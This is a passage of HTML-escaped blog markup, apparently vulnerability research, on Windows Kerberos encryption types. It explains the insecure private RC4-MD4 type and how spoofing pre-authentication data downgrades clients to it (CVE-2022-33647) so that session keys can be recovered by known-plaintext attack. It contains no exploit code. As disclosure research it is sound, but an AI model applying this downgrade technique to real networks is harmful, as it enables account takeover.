return the user's TGT and encrypted session key. This would prevent an attacker getting encrypted data for the brute force attack.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;However, Windows does support a user account flag, &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"Do not require Kerberos preauthentication\"&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. If this flag is enabled on a user the authentication request does not require the encrypted timestamp to be sent and the AS-REP roasting process can continue. This should be an uncommon configuration.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The success of the brute-force attack entirely depends on the password complexity. Typically service user accounts have a long, at least 25 character, randomly generated password which is all but impossible to brute force. Normal users would typically have weaker passwords, but they are less likely to have a configured SPN which would make them targets for Kerberoasting. The system administrator can also mitigate the attack by disabling RC4 entirely across the network, though this is not commonly done for compatibility reasons. A more limited alternative is to add sensitive users to the &lt;/span&gt;&lt;a href=\"https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;Protected Users Group&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;, which disables RC4 for them without having to disable it across the entire network.&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Windows Kerberos Encryption Implementation&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;While working on researching Windows Defender Credential Guard (CG) I wanted to understand how Windows actually implements the various Kerberos encryption schemes. The primary goal of CG at least for Kerberos is to protect the user's keys, specifically the ones derived from their password and session keys for the TGT. If I could find a way of using one of the keys with a weak encryption algorithm I hoped to be able to extract the original key removing CG's protection.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The encryption algorithms are all implemented inside the CRYPTDLL.DLL library which is separate from the core Kerberos library in KERBEROS.DLL on the client and KDCSVC.DLL on the server. This interface is undocumented but it's fairly easy to work out how to call the exported functions. For example, to get a \"crypto system\" from the encryption type integer you can use the following exported function:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;NTSTATUS CDLocateCSystem(int etype, KERB_ECRYPT** engine);&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;KERB_ECRYPT&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; structure contains configuration information for the engine such as the size of the key and function pointers to convert a password to a key, generate new session keys, and perform encryption or decryption. The structure also contains a textual name so that you can get a quick idea of what algorithm is supposed to be, which lead to the following supported systems:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Name&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Encryption Type&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;----&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ---------------&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;RSADSI RC4-HMAC &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 24&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;RSADSI RC4-HMAC &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 23&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Kerberos AES256-CTS-HMAC-SHA1-96&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 18&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Kerberos AES128-CTS-HMAC-SHA1-96&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 17&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Kerberos DES-CBC-MD5&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 3&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Kerberos DES-CBC-CRC&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 1&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;RSADSI RC4-MD4&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; -128&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Kerberos DES-Plain&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; -132&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;RSADSI RC4-HMAC &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; -133&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;RSADSI RC4&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; -134&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;RSADSI RC4-HMAC &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; -135&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;RSADSI RC4-EXP&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; -136&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;RSADSI RC4&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; -140&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;RSADSI RC4-EXP&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; -141&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Kerberos AES128-CTS-HMAC-SHA1-96-PLAIN&amp;nbsp; -148&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Kerberos AES256-CTS-HMAC-SHA1-96-PLAIN&amp;nbsp; -149&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Encryption types with positive values are well-known encryption types defined in the RFCs, whereas negative values are private types. Therefore I decided to spend my time on these private types. Most of the private types were just subtle variations on the existing well-known types, or clones with legacy numbers.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;However, one stood out as being different from the rest, \"RSADSI RC4-MD4\" with type value -128. This was different because the implementation was incredibly insecure, specifically it had the following properties:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;ul style=\"margin-bottom: 0px; margin-top: 0px; padding-inline-start: 48px;\"&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Keys are 16 bytes in size, but only the first 8 of the key bytes are used by the encryption algorithm.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The key is used as-is, there's no blinding so the key stream is always the same for the same user key.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The message type is ignored, which means that the key stream is the same for different parts of the Kerberos protocol when using the same key.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The encrypted data does not contain any cryptographic hash to protect from tampering with the ciphertext which for RC4 is basically catastrophic. Even though the name contains MD4 this is only used for deriving the key from the password, not for any message integrity.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Generated session keys are 16 bytes in size but only contain 40 bits (5 bytes) of randomness. The remaining 11 bytes are populated with the fixed value of 0xAB.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;To say this is bad from a cryptographic standpoint, is an understatement. Fortunately it would be safe to assume that while this crypto system is implemented in CRYPTDLL, it wouldn't be used by Kerberos? Unfortunately not — it is totally accepted as a valid encryption type when sent in the AS-REQ to the KDC. The question then becomes how to exploit this behavior?&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Exploitation on the Wire (CVE-2022-33647)&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;My first thoughts were to attack the session key generation. If we could get the server to return the AS-REP with a RC4-MD4 session key for the TGT then any subsequent usage of that key could be captured and used to brute force the 40 bit key. At that point we could take the user's TGT which is sent in the clear and the session key and make requests as that authenticated user.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The most obvious approach to forcing the preferred encryption type to be RC4-MD4 would be to interpose the connection between a client and the KDC. The &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;etype&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; field of the AS-REQ is not protected for password based authentication. Therefore a proxy can modify the field to only include RC4-MD4 which is then sent to the KDC. Once that's completed the proxy would need to also capture a service ticket request to get encrypted data to brute force.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Brute forcing the 40 bit key would be technically feasible at least if you built a giant lookup table, however I felt like it's not practical. I realized there's a simpler way, when a client authenticates it typically sends a request to the KDC with no pre-authentication timestamp present. As long as pre-authentication hasn't been disabled the KDC returns a Kerberos error to the client with the &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;KDC_ERR_PREAUTH_REQUIRED&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; error code.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;As part of that error response the KDC also sends a list of acceptable encryption types in the &lt;/span&gt;&lt;a href=\"https://datatracker.ietf.org/doc/html/rfc4120#section-5.2.7.5\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;PA-ETYPE-INFO2&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; pre-authentication data structure. This list contains additional information for the password to key derivation such as the salt for AES keys. The client can use this information to correctly generate the encryption key for the user. I noticed that if you sent back only a single entry indicating support for RC4-MD4 then the client would use the insecure algorithm for generating the pre-authentication timestamp. This worked even if the client didn't request RC4-MD4 in the first place.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;When the KDC received the timestamp it would validate it using the RC4-MD4 algorithm and return the AS-REP with the TGT's RC4-MD4 session key encrypted using the same key as the timestamp. Due to the already mentioned weaknesses in the RC4-MD4 algorithm the key stream used for the timestamp must be the same as used in the response to encrypt the session key. Therefore we could mount a known-plaintext attack to recover the keystream from the timestamp and use that to decrypt parts of the response.&lt;/span&gt;&lt;/p&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;/span&gt;&lt;/p&gt;\n\n&lt;a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUvTW1UFAq2BkR82D8pZBtol-7uMDtXUhYYWtsdj59L02yosepSSb2zaddG7GkNt9t8YvR7pQogCoZDMv9shMSF_iq0V4pIuDCt-o042w285bolE5_s3gGXZKI-XreYKDGzT48ShCCbyijZU0dDvrpFTVl-Kk4KYX6gYokC4vjlq6GpZt9_rfBRgje/s1465/image3.png' style='display: block; padding: 1em 0; text-align: center;'&gt;&lt;img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUvTW1UFAq2BkR82D8pZBtol-7uMDtXUhYYWtsdj59L02yosepSSb2zaddG7GkNt9t8YvR7pQogCoZDMv9shMSF_iq0V4pIuDCt-o042w285bolE5_s3gGXZKI-XreYKDGzT48ShCCbyijZU0dDvrpFTVl-Kk4KYX6gYokC4vjlq6GpZt9_rfBRgje/s600/image3.png' alt=\"Diagram showing the attack process. A computer with a kerberos client sends an AS-REQ to the attacker, which returns an error requesting pre-authentication and selecting RC4-MD4 encryption. The client then converts the user's password into an RC4-MD4 key which is used to encrypt the timestamp to send to the KDC. This is used to validate the user authentication and an AS-REP is returned with a TGT session key generated for RC4-MD4.\" title=\"Diagram showing the attack process. A computer with a kerberos client sends an AS-REQ to the attacker, which returns an error requesting pre-authentication and selecting RC4-MD4 encryption. The client then converts the user's password into an RC4-MD4 key which is used to encrypt the timestamp to send to the KDC. This is used to validate the user authentication and an AS-REP is returned with a TGT session key generated for RC4-MD4.\" border='0' style='max-height: 750px; max-width: 600px;' /&gt;&lt;/a&gt;\n\n&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;br /&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline;\"&gt;The timestamp itself has the following ASN.1 structure, which is serialized using the &lt;/span&gt;&lt;a href=\"https://en.wikipedia.org/wiki/X.690#DER_encoding\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline;\"&gt;Distinguished Encoding Rules (DER)&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline;\"&gt; and then encrypted.&lt;/span&gt;&lt;/span&gt;&lt;p&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;PA-ENC-TS-ENC &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ::= SEQUENCE {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;patimestamp &amp;nbsp; &amp;nbsp; [0] KerberosTime -- client's time --,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pausec&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [1] Microseconds OPTIONAL&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p 